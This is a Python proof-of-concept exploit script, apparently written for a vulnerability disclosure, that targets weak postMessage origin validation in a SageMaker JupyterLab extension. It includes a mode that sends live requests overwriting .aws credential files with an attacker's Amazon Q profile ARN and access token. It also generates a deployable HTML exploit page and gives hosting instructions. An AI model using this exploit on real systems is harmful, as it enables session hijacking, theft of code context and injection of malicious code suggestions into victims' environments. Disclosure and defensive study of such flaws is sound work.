#!/usr/bin/env python3
"""
PoC: Amazon Q Developer Profile Hijack via Weak Origin Validation

Finding 11 — Credential File Write in @amzn/sagemaker-jupyterlab-extension-common

OVERVIEW
========
The SageMaker JupyterLab common extension (v0.2.15) listens for window
postMessage events to receive IAM Identity Center credentials from the
parent SageMaker Studio frame. The origin validation uses wildcard-match
with overly permissive glob patterns containing ** (double-star), which
matches ANY characters including dots.

An attacker controlling a subdomain that matches any allowed pattern can
send a crafted postMessage to overwrite the Amazon Q Developer profile ARN,
redirecting all Q Developer API requests to an attacker-controlled profile.

VULNERABLE CODE (deobfuscated from 988.*.js)
============================================
  // Origin validation — ** matches anything including dots
  this.isMessageOriginValid = (event) => {
    return this.isLocalhost()
      ? "http://localhost:5173" === event.origin
      : [
          "https://**.sagemaker.*.on.aws",
          "https://**.ui.*.aws.dev",
          "https://**.datazone.*.on.aws",
          // ... more patterns
        ].some((pattern) => wildcardMatch(pattern)(event.origin));
  };

  // Message handler — parses JSON and writes credentials to disk
  this.messageListener = async (event) => {
    if (this.isMessageOriginValid(event)) {
      const data = JSON.parse(event.data);
      if ("accessToken" in data) {
        this.updateMetadata(data);  // writes to .aws/ via Jupyter API
      }
    }
  };

  // updateMetadata writes FOUR files via PUT /api/contents/...
  async updateMetadata(data) {
    // 1. PUT /api/contents/.aws/sso/idc_access_token.json
    await this.putMetadataFile(".aws/sso", "idc_access_token", "json",
      { idc_access_token: data.accessToken });

    // 2. PUT /api/contents/.aws/amazon_q/q_dev_profile.json  <-- HIJACK TARGET
    await this.putMetadataFile(".aws/amazon_q", "q_dev_profile", "json",
      { q_dev_profile_arn: data.profileArn || "" });

    // 3. PUT /api/contents/.aws/amazon_q/settings.json
    await this.putMetadataFile(".aws/amazon_q", "settings", "json",
      { auth_mode: data.qSettings?.auth_mode || "IAM",
        q_enabled: data.qSettings?.q_enabled || false });

    // 4. PUT /api/contents/.aws/enabled_features/enabled_features.json
    await this.putMetadataFile(".aws/enabled_features", "enabled_features", "json",
      { enabled_features: data.enabledFeatures || [] });

    // Force environment to reload poisoned credentials
    await fetch("/aws/sagemaker/api/cache", { method: "POST" });
    await fetch("/amazon_q_developer_jupyterlab_ext/clear_environment_cache",
                { method: "POST" });
  }

ATTACK CHAIN
============
  1. Attacker obtains control of a subdomain matching allowed patterns
     e.g., evil.sagemaker.us-east-1.on.aws (subdomain takeover / registration)
  2. Attacker hosts the exploit page on that origin
  3. Victim opens SageMaker JupyterLab (in iframe or same browsing context)
  4. Exploit page sends postMessage with attacker's profile ARN + access token
  5. Extension validates origin → PASSES (glob matches)
  6. Extension writes attacker's profile to .aws/amazon_q/q_dev_profile.json
  7. Extension clears environment cache → Q Developer reloads with hijacked profile
  8. All subsequent Q Developer interactions use attacker's profile

IMPACT
======
  - Code suggestions from Amazon Q are now controlled by attacker's profile
  - Attacker can exfiltrate code context sent to Q Developer
  - Attacker can inject malicious code suggestions
  - Combined with IDC token injection, attacker gets full AWS session access
"""

import json
import http.server
import urllib.parse
import argparse
import textwrap
import sys


# ============================================================
# Part 1: Direct Jupyter Contents API exploitation
#          (simulates what the extension does after postMessage)
# ============================================================

def simulate_direct_api_attack(jupyter_base_url: str, attacker_profile_arn: str,
                                attacker_token: str, dry_run: bool = True):
    """
    Simulates the exact HTTP requests the extension makes after
    receiving a valid postMessage. In a real attack these are triggered
    by the extension code, not called directly (the extension runs in
    the victim's browser with their Jupyter session cookies).

    This function demonstrates the API calls for analysis purposes.
    """

    requests_to_make = [
        {
            "description": "Create .aws directory",
            "method": "PUT",
            "path": f"{jupyter_base_url}/api/contents/.aws",
            "body": {"type": "directory", "format": "text", "name": ".aws"}
        },
        {
            "description": "Create .aws/sso directory",
            "method": "PUT",
            "path": f"{jupyter_base_url}/api/contents/.aws/sso",
            "body": {"type": "directory", "format": "text", "name": "sso"}
        },
        {
            "description": "Create .aws/amazon_q directory",
            "method": "PUT",
            "path": f"{jupyter_base_url}/api/contents/.aws/amazon_q",
            "body": {"type": "directory", "format": "text", "name": "amazon_q"}
        },
        {
            "description": "Write IDC access token (session hijack)",
            "method": "PUT",
            "path": f"{jupyter_base_url}/api/contents/.aws/sso/idc_access_token.json",
            "body": {
                "content": json.dumps({"idc_access_token": attacker_token}),
                "format": "text",
                "name": "idc_access_token.json",
                "type": "file"
            }
        },
        {
            "description": "Write Q Developer profile ARN (PROFILE HIJACK)",
            "method": "PUT",
            "path": f"{jupyter_base_url}/api/contents/.aws/amazon_q/q_dev_profile.json",
            "body": {
                "content": json.dumps({"q_dev_profile_arn": attacker_profile_arn}),
                "format": "text",
                "name": "q_dev_profile.json",
                "type": "file"
            }
        },
        {
            "description": "Write Q settings (enable Q with IAM auth)",
            "method": "PUT",
            "path": f"{jupyter_base_url}/api/contents/.aws/amazon_q/settings.json",
            "body": {
                "content": json.dumps({"auth_mode": "IAM", "q_enabled": True}),
                "format": "text",
                "name": "settings.json",
                "type": "file"
            }
        },
        {
            "description": "Invalidate credential cache",
            "method": "POST",
            "path": f"{jupyter_base_url}/aws/sagemaker/api/cache",
            "body": None
        },
        {
            "description": "Clear Q Developer environment cache (force reload)",
            "method": "POST",
            "path": f"{jupyter_base_url}/amazon_q_developer_jupyterlab_ext/clear_environment_cache",
            "body": None
        }
    ]

    print("\n[*] Amazon Q Profile Hijack — API Request Sequence")
    print("=" * 70)

    for i, req in enumerate(requests_to_make, 1):
        print(f"\n  Step {i}: {req['description']}")
        print(f"    {req['method']} {req['path']}")
        if req['body']:
            print(f"    Body: {json.dumps(req['body'], indent=2)[:200]}")

        if not dry_run:
            import urllib.request
            data = json.dumps(req['body']).encode() if req['body'] else None
            r = urllib.request.Request(req['path'], data=data, method=req['method'])
            r.add_header('Content-Type', 'application/json')
            try:
                resp = urllib.request.urlopen(r)
                print(f"    Response: {resp.status} {resp.reason}")
            except Exception as e:
                print(f"    Error: {e}")

    print("\n" + "=" * 70)
    if dry_run:
        print("[*] DRY RUN — no requests sent. Use --execute to send requests.")
    else:
        print("[!] Profile hijack complete. Q Developer now uses attacker profile.")


# ============================================================
# Part 2: Generate the attacker's HTML exploit page
#          (to be hosted on a matching origin)
# ============================================================

def generate_exploit_html(attacker_profile_arn: str, attacker_token: str) -> str:
    """
    Generates an HTML page that, when served from an origin matching
    the allowed wildcard patterns, will inject the attacker's Q profile
    into the victim's SageMaker JupyterLab session.
    """

    payload = json.dumps({
        "accessToken": attacker_token,
        "profileArn": attacker_profile_arn,
        "qSettings": {
            "auth_mode": "IAM",
            "q_enabled": True
        },
        "enabledFeatures": ["all"]
    })

    return textwrap.dedent(f"""\
    <!DOCTYPE html>
    <html>
    <head><title>Loading...</title></head>
    <body>
    <!--
      Amazon Q Profile Hijack Exploit Page

      DEPLOYMENT: Host this on a subdomain matching the allowed patterns:
        - https://YOURSITE.sagemaker.us-east-1.on.aws
        - https://YOURSITE.ui.REGION.aws.dev
        - https://YOURSITE.datazone.REGION.on.aws

      DELIVERY: The victim must open this page in a context where it can
      reach the JupyterLab window (iframe parent, window.open, etc.)
    -->
    <script>
    (function() {{
      const PAYLOAD = '{payload}';

      // Strategy 1: If we opened the JupyterLab window
      function injectViaOpener() {{
        if (window.opener) {{
          window.opener.postMessage(PAYLOAD, '*');
          return true;
        }}
        return false;
      }}

      // Strategy 2: If JupyterLab is in a child iframe
      function injectViaIframe() {{
        const frames = document.querySelectorAll('iframe');
        frames.forEach(f => {{
          try {{ f.contentWindow.postMessage(PAYLOAD, '*'); }}
          catch(e) {{}}
        }});
      }}

      // Strategy 3: If we are in an iframe inside JupyterLab's parent
      function injectViaParent() {{
        if (window.parent && window.parent !== window) {{
          // Post to all sibling frames
          try {{
            for (let i = 0; i < window.parent.frames.length; i++) {{
              try {{ window.parent.frames[i].postMessage(PAYLOAD, '*'); }}
              catch(e) {{}}
            }}
          }} catch(e) {{}}
          // Also post to parent directly (JupyterLab may be the parent)
          window.parent.postMessage(PAYLOAD, '*');
        }}
      }}

      // Strategy 4: Broadcast to all reachable windows
      function injectBroadcast() {{
        // If opened via window.open, the opener is the JupyterLab tab
        if (window.opener) {{
          window.opener.postMessage(PAYLOAD, '*');
        }}
        // If we are a frame, try parent and siblings
        if (window.parent !== window) {{
          window.parent.postMessage(PAYLOAD, '*');
        }}
      }}

      // Execute all strategies
      injectViaOpener();
      injectViaParent();
      injectBroadcast();

      // Also retry after a delay (JupyterLab may still be loading)
      setTimeout(function() {{
        injectViaOpener();
        injectViaParent();
        injectBroadcast();
      }}, 3000);

      // If this page can create an iframe to JupyterLab (same-origin)
      // this is the most reliable method
      setTimeout(function() {{
        injectViaIframe();
      }}, 5000);
    }})();
    </script>

    <noscript>Please enable JavaScript.</noscript>
    </body>
    </html>
    """)


# ============================================================
# Part 3: Verify current Q profile on a live instance
# ============================================================

def verify_current_profile(jupyter_base_url: str):
    """Read the current Q Developer profile to confirm hijack."""
    import urllib.request

    paths = [
        (".aws/amazon_q/q_dev_profile.json", "Q Developer Profile ARN"),
        (".aws/amazon_q/settings.json", "Q Developer Settings"),
        (".aws/sso/idc_access_token.json", "IDC Access Token"),
        (".aws/enabled_features/enabled_features.json", "Enabled Features"),
    ]

    print("\n[*] Current Q Developer Configuration")
    print("=" * 70)

    for path, label in paths:
        url = f"{jupyter_base_url}/api/contents/{path}"
        try:
            r = urllib.request.urlopen(url)
            data = json.loads(r.read())
            content = json.loads(data.get("content", "{}"))
            print(f"\n  {label}:")
            print(f"    Path: {path}")
            print(f"    Content: {json.dumps(content, indent=2)}")
        except Exception as e:
            print(f"\n  {label}: Not found or not accessible ({e})")


# ============================================================
# Part 4: Origin pattern analysis
# ============================================================

def analyze_origin_patterns():
    """Show which origins pass the weak validation."""

    import re

    patterns = [
        "https://**.v2.*.beta.app.*.aws.dev",
        "https://**.ui.*.aws.dev",
        "https://**.v2.*-gamma.*.on.aws",
        "https://**.datazone.*.on.aws",
        "https://**.sagemaker.*.on.aws",
        "https://**.sagemaker-gamma.*.on.aws",
    ]

    def wildcard_to_regex(pattern):
        regex = re.escape(pattern)
        regex = regex.replace(r'\*\*', '.*')
        regex = regex.replace(r'\*', '[^/]*')
        return re.compile('^' + regex + '$')

    test_origins = {
        "Legitimate origins": [
            "https://studio.v2.us-east-1.beta.app.sagemaker.aws.dev",
            "https://nb-abc123.sagemaker.us-east-1.on.aws",
            "https://app.ui.us-east-1.aws.dev",
        ],
        "Attacker-controlled (SHOULD BE BLOCKED)": [
            "https://evil.sagemaker.us-east-1.on.aws",
            "https://phishing.sagemaker.eu-west-1.on.aws",
            "https://x.y.z.sagemaker.anything.on.aws",
            "https://malicious.ui.foobar.aws.dev",
            "https://attacker.datazone.us-east-1.on.aws",
            "https://a.b.c.d.e.f.sagemaker.x.on.aws",
        ],
        "Should be blocked (and ARE blocked)": [
            "https://evil.com",
            "http://evil.sagemaker.us-east-1.on.aws",
            "https://sagemaker.amazonaws.com",
        ],
    }

    print("\n[*] Origin Pattern Weakness Analysis")
    print("=" * 70)
    print(f"\nAllowed patterns (from extension source):")
    for p in patterns:
        print(f"  {p}")

    compiled = [wildcard_to_regex(p) for p in patterns]

    for category, origins in test_origins.items():
        print(f"\n--- {category} ---")
        for origin in origins:
            matches = any(r.match(origin) for r in compiled)
            status = "PASSES" if matches else "BLOCKED"
            indicator = "[!]" if matches and "SHOULD" in category else "[+]" if matches else "[-]"
            print(f"  {indicator} {status}: {origin}")


# ============================================================
# Main
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC: Amazon Q Developer Profile Hijack via Weak Origin Validation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          # Analyze origin patterns (no network access needed)
          python3 %(prog)s --analyze

          # Show API requests for profile hijack (dry run)
          python3 %(prog)s --simulate --target http://localhost:8888

          # Generate exploit HTML to host on matching origin
          python3 %(prog)s --generate-exploit --profile-arn arn:aws:...

          # Verify current profile on a live instance
          python3 %(prog)s --verify --target http://localhost:8888

        IMPACT:
          1. Q Developer profile ARN overwrite
             → Attacker controls code suggestions, can inject malicious code
          2. IDC access token injection
             → Session hijack, attacker assumes victim's AWS identity
          3. Auth settings manipulation
             → Can switch auth mode or disable Q entirely
          4. Forced cache invalidation
             → Environment immediately reloads poisoned credentials
        """)
    )

    parser.add_argument("--analyze", action="store_true",
                        help="Analyze origin validation patterns")
    parser.add_argument("--simulate", action="store_true",
                        help="Simulate the API requests (dry run)")
    parser.add_argument("--execute", action="store_true",
                        help="Actually send API requests (CAUTION)")
    parser.add_argument("--generate-exploit", action="store_true",
                        help="Generate exploit HTML page")
    parser.add_argument("--verify", action="store_true",
                        help="Read current Q profile from Jupyter")
    parser.add_argument("--target", default="http://localhost:8888",
                        help="JupyterLab base URL (default: http://localhost:8888)")
    parser.add_argument("--profile-arn",
                        default="arn:aws:codewhisperer:us-east-1:123456789012:profile/attacker-profile",
                        help="Attacker's Q Developer profile ARN")
    parser.add_argument("--token", default="attacker-injected-idc-token-value",
                        help="Attacker's IDC access token")

    args = parser.parse_args()

    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║  Finding 11: Amazon Q Developer Profile Hijack PoC          ║
    ║  Weak Origin Validation in sagemaker-extension-common       ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

    if not any([args.analyze, args.simulate, args.execute,
                args.generate_exploit, args.verify]):
        args.analyze = True
        args.simulate = True

    if args.analyze:
        analyze_origin_patterns()

    if args.simulate:
        simulate_direct_api_attack(args.target, args.profile_arn,
                                    args.token, dry_run=True)

    if args.execute:
        print("\n[!] WARNING: This will modify files on the target Jupyter server!")
        confirm = input("    Type 'YES' to proceed: ")
        if confirm == "YES":
            simulate_direct_api_attack(args.target, args.profile_arn,
                                        args.token, dry_run=False)
        else:
            print("    Aborted.")

    if args.generate_exploit:
        html = generate_exploit_html(args.profile_arn, args.token)
        outfile = "exploit_q_profile_hijack.html"
        with open(outfile, "w") as f:
            f.write(html)
        print(f"\n[*] Exploit HTML written to: {outfile}")
        print(f"    Host this on an origin matching the allowed patterns, e.g.:")
        print(f"    https://YOUR-SUBDOMAIN.sagemaker.us-east-1.on.aws")

    if args.verify:
        verify_current_profile(args.target)


if __name__ == "__main__":
    main()
